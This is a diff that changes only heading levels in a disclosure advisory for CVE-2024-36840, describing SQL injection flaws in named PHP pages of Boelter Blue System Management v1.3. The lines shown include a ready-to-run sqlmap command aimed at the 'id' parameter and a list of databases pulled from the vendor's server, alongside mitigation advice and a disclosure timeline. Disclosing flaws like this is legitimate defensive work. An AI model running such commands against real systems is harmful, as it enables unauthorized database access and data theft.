@@ -10,11 +10,11 @@
 **Software Link**: [Google Play Store](https://play.google.com/store/apps/details?id=com.anchor5digital.anchor5adminapp&hl=en_US)  
 **Tested on**: Linux Debian 9 (stretch), Apache 2.4.25, MySQL >= 5.0.12  
 
-## Overview
+# Overview
 
 Boelter Blue System Management v1.3 has been found to contain multiple critical SQL injection vulnerabilities. These vulnerabilities allow attackers to execute arbitrary SQL queries, potentially leading to sensitive data exposure, unauthorized access, and complete control over the affected database.
 
-## Affected Component##
+# Affected Component##
 > news_details.php  
 > services.php  
 > location_details.php
@@ -23,7 +23,7 @@ Boelter Blue System Management v1.3 has been found to contain multiple critical 
 >  - section parameter
 
   
-## PoC Example
+# PoC Example
 **SQLMap Injection**:   
 `sqlmap -u "https://www.example.com/news_details.php?id=10071" --random-agent --dbms=mysql --dbs`
 
@@ -40,7 +40,7 @@ Boelter Blue System Management v1.3 has been found to contain multiple critical 
 
 
 
-## Injection Types:
+# Injection Types:
 
     Boolean-based blind
     Parameter: id (GET)
@@ -63,7 +63,7 @@ Boelter Blue System Management v1.3 has been found to contain multiple critical 
 
 
 
-## HTTP Requests:
+# HTTP Requests:
 
     Boolean-based blind
     
@@ -102,7 +102,7 @@ Boelter Blue System Management v1.3 has been found to contain multiple critical 
 
 
 
-## Impact
+# Impact
 
 These vulnerabilities can be exploited to achieve the following:
 
@@ -111,15 +111,15 @@ These vulnerabilities can be exploited to achieve the following:
 -   **Account Takeover**: By retrieving and decrypting user credentials.
 -   **Full Database Access**: Ability to read, modify, and delete any data in the database.
 
-## Technical Details
+# Technical Details
 
-### Database Information
+# Database Information
 
 **DBMS**: MySQL >= 5.0.12  
 **Web Server**: Apache 2.4.25  
 **Operating System**: Linux Debian 9 (stretch)
 
-#### Extracted Databases
+# Extracted Databases
 
     available databases [5]:
     [*] Anchor5Digital
@@ -129,7 +129,7 @@ These vulnerabilities can be exploited to achieve the following:
     [*] sys
 
 
-#### Sample Extracted Data
+# Sample Extracted Data
 
 **Database: Anchor5Digital**
 
@@ -188,7 +188,7 @@ These vulnerabilities can be exploited to achieve the following:
     +-----------------+
 
 
-## Mitigation
+# Mitigation
 
 To mitigate these vulnerabilities, it is recommended to:
 
@@ -196,13 +196,13 @@ To mitigate these vulnerabilities, it is recommended to:
 -   **Use Parameterized Queries**: Implement parameterized queries or prepared statements to prevent SQL injection.
 -   **Implement a WAF**: Deploy a Web Application Firewall to detect and block SQL injection attempts.
 
-## References
+# References
 
 -   [Boelter Blue Homepage](https://www.boelter.com/)
 -   [Google Play Store](https://play.google.com/store/apps/details?id=com.anchor5digital.anchor5adminapp&hl=en_US)
 -   [CVE - MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-36840)
 
-## Disclosure Timeline
+# Disclosure Timeline
 
 -   **2023**: Vulnerabilities discovered by CBKB team.
 -   **2023**: Vendor notified.
@@ -212,11 +212,11 @@ To mitigate these vulnerabilities, it is recommended to:
 -   **2024-06-4**: Exploit disclosed to exploit-db
 -   **2024-06-4**: Exploit disclosed to packetstorm
 
-## CVE Information
+# CVE Information
 
 -   **CVE ID**: [CVE-2024-36840](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-36840)
 
-## Contact Information
+# Contact Information
 
 For any questions or concerns regarding this vulnerability, please contact us at: infosecdb@protonmail.com
 
